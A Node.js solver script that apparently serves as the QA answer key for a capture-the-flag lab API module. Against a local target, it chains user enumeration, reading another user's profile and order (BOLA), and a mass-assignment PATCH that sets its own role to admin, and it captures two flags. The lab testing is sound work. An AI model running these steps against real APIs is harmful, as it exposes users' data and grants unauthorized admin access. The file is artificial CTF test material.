#!/usr/bin/env node
/*
 * VLH-CTF QA solver — ASLV M4 (aslv-api), INTENDED PATH (FR-14).
 *
 * API composite (arch §7.0 M4 / §7.2 path scheme aslv.lab/user/v1/{user}/…):
 *   1. login as the known tester (session cookie)
 *   2. GET /user/v1/list            — directory (find the innocent uuid)
 *   3. GET /user/v1/{uuid}/profile  — EXCESSIVE DATA EXPOSURE (BOPLA):
 *                                     uuid+email+tenant for every user
 *   4. GET /user/v1/{uuid}/orders/1001 — BOLA: order resolved by id with no
 *                                     ownership tie → innocent pivot material
 *   5. PATCH /user/v1/{self} {role:"admin"} — MASS ASSIGNMENT: the update
 *                                     whitelist includes `role` → own profile
 *                                     now shows flag1 (stage 1)
 *   6. GET /admin/v1/panel          — role verified server-side (users.role
 *                                     was updated) → flag2 (stage 2)
 *
 * Env: M4_URL (default http://localhost:18025 — m4 standalone sidecar).
 * Node 20+ built-ins only. Exit 0 only when BOTH stage flags are captured.
 */
import http from 'node:http';

const M4_URL = process.env.M4_URL || 'http://localhost:18025';
const BASE = new URL(M4_URL);
const PORT = Number(BASE.port || 80);
const API_HOST = `api.aslv.lab:${PORT}`;
const FLAG_RE = /ASLV\{API-\d{9,10}\}/;

const log = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const die = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { host, headers = {}, body, jar } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null
      : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { ...headers };
    if (host) h.host = host;
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    if (jar && jar.size) h.cookie = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    const req = http.request(
      { host: BASE.hostname, port: PORT, path, method, headers: h },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (jar) {
            for (const c of res.headers['set-cookie'] || []) {
              const m = /([^=;]+)=([^;]*)/.exec(c);
              if (m) jar.set(m[1].trim(), m[2]);
            }
          }
          const text = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try { json = JSON.parse(text); } catch (_) { /* html */ }
          resolve({ status: res.statusCode, headers: res.headers, text, json });
        });
      },
    );
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

async function main() {
  log(`M4 target: ${M4_URL} (host: ${API_HOST})`);
  const flags = {};

  /* 1. login as the known tester */
  const jar = new Map();
  const login = await request('POST', '/user/v1/login', {
    host: API_HOST, jar,
    body: { username: '0xnhsec', password: 'vlh-tester-01' },
  });
  if (login.status !== 200 || !login.json?.ok) die(`tester login failed: ${login.status} ${login.text.slice(0, 200)}`);
  if (!jar.has('sid')) die('login did not set a sid session cookie');
  ok(`logged in as ${login.json.username} (uuid=${login.json.uuid} role=${login.json.role})`);

  /* 2. directory — find the innocent */
  const list = await request('GET', '/user/v1/list', { host: API_HOST, jar });
  if (list.status !== 200 || !Array.isArray(list.json?.users)) die(`GET /user/v1/list failed: ${list.status} ${list.text.slice(0, 200)}`);
  const innocent = list.json.users.find((u) => u.role === 'innocent');
  if (!innocent) die('no innocent user found in /user/v1/list');
  ok(`innocent identity: ${innocent.username} uuid=${innocent.uuid} tenant=${innocent.tenant}`);

  /* 3. excessive data exposure on another user's profile */
  const prof = await request('GET', `/user/v1/${innocent.uuid}/profile`, { host: API_HOST, jar });
  if (prof.status !== 200 || !prof.json?.uuid) die(`GET /user/v1/{innocent}/profile failed: ${prof.status} ${prof.text.slice(0, 200)}`);
  ok(`excessive exposure: innocent profile readable by the tester — email=${prof.json.email} tenant=${prof.json.tenant} uuid=${prof.json.uuid}`);

  /* 4. BOLA — order by id, no ownership tie */
  const order = await request('GET', `/user/v1/${innocent.uuid}/orders/1001`, { host: API_HOST, jar });
  if (order.status !== 200) {
    console.log(`[!] BOLA order probe returned ${order.status} (continuing): ${order.text.slice(0, 160)}`);
  } else if (order.json?.secret_note) {
    ok(`BOLA: innocent order #1001 secret_note: ${String(order.json.secret_note).slice(0, 140)}`);
  }

  /* 5. mass assignment — escalate own role via the bindable `role` field */
  const patch = await request('PATCH', '/user/v1/0xnhsec', {
    host: API_HOST, jar,
    body: { role: 'admin' },
  });
  if (patch.status !== 200) die(`PATCH /user/v1/0xnhsec {role:admin} failed: ${patch.status} ${patch.text.slice(0, 300)}`);
  const flag1 = FLAG_RE.exec(patch.text)?.[0];
  if (!flag1) die(`PATCH succeeded but no flag1 in the response (role=${patch.json?.role}): ${patch.text.slice(0, 300)}`);
  flags.API_stage1 = flag1;
  ok(`API flag1 (mass assignment escalation): ${flags.API_stage1} (role: ${patch.json.original_role} → ${patch.json.role})`);

  /* 6. admin panel — role verified server-side from the session's user row */
  const panel = await request('GET', '/admin/v1/panel', { host: API_HOST, jar });
  if (panel.status !== 200) die(`GET /admin/v1/panel failed: ${panel.status} ${panel.text.slice(0, 300)}`);
  const flag2 = FLAG_RE.exec(panel.text)?.[0];
  if (!flag2) die(`panel returned no flag2: ${panel.text.slice(0, 300)}`);
  flags.API_stage2 = flag2;
  ok(`API flag2 (admin panel, server-side role check): ${flags.API_stage2}`);

  console.log('\n=== M4 intended path: BOTH STAGE FLAGS ===');
  for (const [k, v] of Object.entries(flags)) console.log(`  ${k}: ${v}`);
  process.exit(0);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND')) {
    die(`cannot connect to ${M4_URL} (${e.code}) — is the m4 profile running?  docker compose --profile m4 up -d`);
  }
  die(`unexpected error: ${e && e.stack ? e.stack : e}`);
});
